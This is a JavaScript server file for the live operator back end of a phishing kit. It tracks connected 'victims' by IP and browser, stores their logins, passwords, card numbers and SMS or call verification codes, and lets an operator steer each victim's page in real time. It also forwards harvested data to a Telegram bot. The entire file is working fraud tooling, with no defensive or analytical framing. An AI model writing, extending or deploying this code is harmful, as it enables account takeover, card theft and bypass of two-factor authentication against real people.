// Socket.io + HTTP server for Railway/Render
// Handles real-time admin panel + Telegram notifications + Config API

const http = require('http');
const socketIo = require('socket.io');
const fetch = require('node-fetch');
const url = require('url');

const PORT = process.env.PORT || 3001;

// Config (can be updated via admin panel)
let config = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || ''
};

const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS?.split(',') || ['*'];

// Create HTTP server
const server = http.createServer((req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);

  // GET /admin/config - get current config
  if (parsedUrl.pathname === '/admin/config' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      token: config.botToken ? config.botToken.substring(0, 10) + '...' : '',
      chatId: config.chatId,
      fullToken: config.botToken // Admin panel needs full token to display
    }));
    return;
  }

  // POST /admin/config - update config
  if (parsedUrl.pathname === '/admin/config' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        if (data.token && data.chatId) {
          config.botToken = data.token;
          config.chatId = data.chatId;
          console.log('Config updated via admin panel');
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true }));
        } else {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Missing token or chatId' }));
        }
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // POST /notify - receive notifications from Netlify functions
  if (parsedUrl.pathname === '/notify' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        if (data.message) {
          await sendTelegram(data.message);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true }));
        } else {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Missing message' }));
        }
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // Health check
  if (parsedUrl.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok', victims: Object.keys(victims).length }));
    return;
  }

  // 404 for other routes
  res.writeHead(404);
  res.end('Not found');
});

// Socket.io setup
const io = socketIo(server, {
  cors: {
    origin: ALLOWED_ORIGINS,
    methods: ['GET', 'POST'],
    credentials: true
  }
});

// In-memory storage
let victims = {};

async function sendTelegram(message) {
  if (!config.botToken || !config.chatId) {
    console.log('[TELEGRAM NOT CONFIGURED] Would send:', message.substring(0, 100) + '...');
    return;
  }
  const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    console.log('Telegram notification sent');
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

// Socket.io handlers
io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  socket.on('admin_join', () => {
    socket.join('admins');
    socket.emit('victims_update', Object.values(victims));
    console.log('Admin joined');
  });

  socket.on('victim_join', (data) => {
    const vId = data.id || socket.id;

    if (!victims[vId]) {
      victims[vId] = {
        id: vId,
        ip: socket.handshake.address,
        data: { niks: [], passwords: [], cards: [], sms_codes: [], call_codes: [] },
        lastSeen: new Date(),
        history: [],
        status: 'online'
      };
    } else {
      victims[vId].status = 'online';
    }

    victims[vId].lastPage = data.page;
    victims[vId].lastSeen = new Date();
    victims[vId].socketId = socket.id;
    victims[vId].userAgent = socket.handshake.headers['user-agent'];
    socket.vId = vId;
    socket.join(vId);

    io.to('admins').emit('victims_update', Object.values(victims));
    console.log('Victim joined:', vId);
  });

  socket.on('admin_command', (data) => {
    const { victimId, command, page } = data;
    if (victims[victimId]) {
      victims[victimId].lastAction = page || command;
    }
    io.to(victimId).emit('command', { command, page });
    console.log('Admin command:', command, 'to', victimId);
  });

  socket.on('disconnect', () => {
    if (socket.vId && victims[socket.vId]) {
      victims[socket.vId].status = 'offline';
      victims[socket.vId].lastSeen = new Date();
      io.to('admins').emit('victims_update', Object.values(victims));
      console.log('Victim disconnected:', socket.vId);
    }
  });
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Telegram configured: ${config.botToken ? 'Yes' : 'No'}`);
});
